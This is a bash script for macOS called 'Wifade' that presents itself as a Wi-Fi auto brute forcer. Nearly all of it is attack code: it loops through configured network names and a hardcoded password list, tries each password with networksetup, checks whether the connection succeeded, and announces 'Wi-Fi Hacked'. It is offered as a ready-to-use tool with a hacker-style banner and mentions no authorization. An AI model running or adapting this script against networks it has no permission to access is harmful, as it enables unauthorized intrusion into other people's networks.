#!/bin/bash


# ASCII Art for WiFade
echo -e "\n\n\e[31m
\t\t █     █░ ██▓  █████▒▄▄▄      ▓█████▄ ▓█████ 
\t\t▓█░ █ ░█░▓██▒▓██   ▒▒████▄    ▒██▀ ██▌▓█   ▀ 
\t\t▒█░ █ ░█ ▒██▒▒████ ░▒██  ▀█▄  ░██   █▌▒███   
\t\t░█░ █ ░█ ░██░░▓█▒  ░░██▄▄▄▄██ ░▓█▄   ▌▒▓█  ▄ 
\t\t░░██▒██▓ ░██░░▒█░    ▓█   ▓██▒░▒████▓ ░▒████▒
\t\t░ ▓░▒ ▒  ░▓   ▒ ░    ▒▒   ▓▒█░ ▒▒▓  ▒ ░░ ▒░ ░
\t\t  ▒ ░ ░   ▒ ░ ░       ▒   ▒▒ ░ ░ ▒  ▒  ░ ░  ░
\t\t  ░   ░   ▒ ░ ░ ░     ░   ▒    ░ ░  ░    ░   
\t\t    ░     ░               ░  ░   ░       ░  ░
\t\t                               ░        
"
echo -e "\e[31m============\e[32mWi-Fi Auto Brute Forcer\e[31m============\e[0m"
echo -e " \e[31mTool: \e[0mWifade \e[31mmacOS-v1.0\e[0m"
echo -e " \e[31mAuthor:\e[0m Faded"
echo -e " \e[31mGitHub:\e[0m https://github.com/anonfaded/wifade"
echo -e " \e[31mCyber Network:\e[0m 🏴 https://linktr.ee/fadedhood 🏴"
echo -e " \e[31mUsage:\e[0m 
  \e[35mConfigure the tool before using, 
  check the README file at GitHub for all details.\e[0m "
echo -e "\e[31m===============================================\e[0m"



# List of Wi-Fi SSIDs to try
SSIDS=("Anonymous") # replace the 'Anonymous' with your hotspot/wifi name (by default script will search for WiFi "Anonymous").
# To use this tool with multiple Wi-Fi networks, add the SSID names to the SSIDS array above. For example: SSIDS=("Anonymous" "Second WiFi" "Third WiFi") and all of them will be brute forced with the passwords that we specify below.

# List of passwords to try
PASSWORDS=("secret" "p4ssw0rd" "12345678") # Add the passwords in double quotes you want to use for brute forcing. This is version 1.0, so there's no option to use a password dictionary yet, but it may be included in future versions.

# Get the device name for the Wi-Fi interface (it's generally en0 on modern Macs, but it's good to check)
WIFI_DEVICE=$(networksetup -listallhardwareports | awk '/Wi-Fi|AirPort/{getline; getline; print $2}')

# Check current connection status
function check_already_connected() {
    local ssid=$1
    local current_ssid=$(networksetup -getairportnetwork $WIFI_DEVICE | cut -d ':' -f2 | xargs)
    if [[ "$current_ssid" == "$ssid" ]]; then
        echo -e "\t \e[35m<<< Already connected to $ssid >>>\e[0m"
        return 0 # 0 = true in bash script
    else
        return 1 # 1 = false in bash script
    fi
}

# Loop through each SSID
for SSID in "${SSIDS[@]}"; do
    echo -e "\n\t \e[34mAttempting to connect to\e[35m $SSID\n \e[0m"
    if check_already_connected "$SSID"; then
        continue # Skip to the next SSID if already connected
    fi
    # Loop through each password
    for PASSWORD in "${PASSWORDS[@]}"; do
        # Attempt to connect
        echo -e "  🔎 Trying password \e[35m$PASSWORD\e[0m"
        # macOS connection attempt
        networksetup -setairportnetwork $WIFI_DEVICE "$SSID" "$PASSWORD"
        sleep 1
        
        # Check if connected
        CURRENT_SSID=$(networksetup -getairportnetwork $WIFI_DEVICE | cut -d ':' -f2 | xargs)
        if [ "$CURRENT_SSID" == "$SSID" ]; then
            echo -e "\n\e[32m\t🎉 Success: Connected to $SSID with password \e[35m$PASSWORD\n\e[0m"
            break 2 # Exit both loops
        else
            echo -e "\e[31m\t🚫 Failed to connect to $SSID with password \e[35m$PASSWORD\n\e[0m"
        fi
    done
done

echo -e "\e[32m\n\t\t\t💀 Wi-Fi Hacked💀\n\n"

